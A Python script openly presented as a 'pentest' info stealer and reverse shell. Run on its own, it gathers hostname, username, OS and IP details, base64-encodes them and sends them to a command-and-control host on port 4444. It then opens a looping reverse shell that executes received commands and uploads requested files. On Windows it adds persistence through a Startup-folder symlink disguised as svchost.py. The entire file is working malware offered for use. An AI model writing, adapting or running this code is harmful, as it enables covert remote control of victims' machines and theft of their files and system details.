#!/usr/bin/env python3
# test_malware.py - Pentest info stealer + reverse shell
import socket
import subprocess
import os
import platform
import getpass
import socket
import threading
import time
import psutil
import base64

# C2 Server config (change to your test listener)
C2_HOST = "YOUR_C2_IP"  # e.g., "192.168.1.100"
C2_PORT = 4444

def get_system_info():
    """Collect system information"""
    info = {
        'hostname': platform.node(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'release': platform.release(),
        'architecture': platform.machine(),
        'ip': socket.gethostbyname(socket.gethostname()),
        'processes': len(psutil.pids())
    }
    return info

def exfiltrate_data():
    """Exfiltrate system info"""
    info = get_system_info()
    data = str(info).encode()
    encoded = base64.b64encode(data)
    
    try:
        s = socket.socket()
        s.connect((C2_HOST, C2_PORT))
        s.send(b"INFO:" + encoded)
        s.close()
    except:
        pass

def reverse_shell():
    """Establish reverse TCP shell"""
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            s.send(b"SHELL_READY")
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == 'exit':
                    break
                
                if command.startswith('upload '):
                    filename = command.split(' ', 1)[1]
                    try:
                        with open(filename, 'rb') as f:
                            filedata = base64.b64encode(f.read())
                        s.send(b"FILE:" + filedata)
                    except:
                        s.send(b"ERROR: File not found")
                    continue
                
                output = subprocess.getoutput(command)
                s.send(output.encode())
            
            s.close()
        except:
            time.sleep(5)

def persistence():
    """Basic persistence mechanism (Windows example)"""
    if platform.system() == "Windows":
        script_dir = os.path.dirname(os.path.abspath(__file__))
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        target = os.path.join(startup_path, 'svchost.py')
        try:
            os.symlink(os.path.abspath(__file__), target)
        except:
            pass

if __name__ == "__main__":
    # Execute payload
    exfiltrate_data()
    persistence()
    
    # Start reverse shell in background
    shell_thread = threading.Thread(target=reverse_shell, daemon=True)
    shell_thread.start()
    
    # Keep alive
    while True:
        time.sleep(60)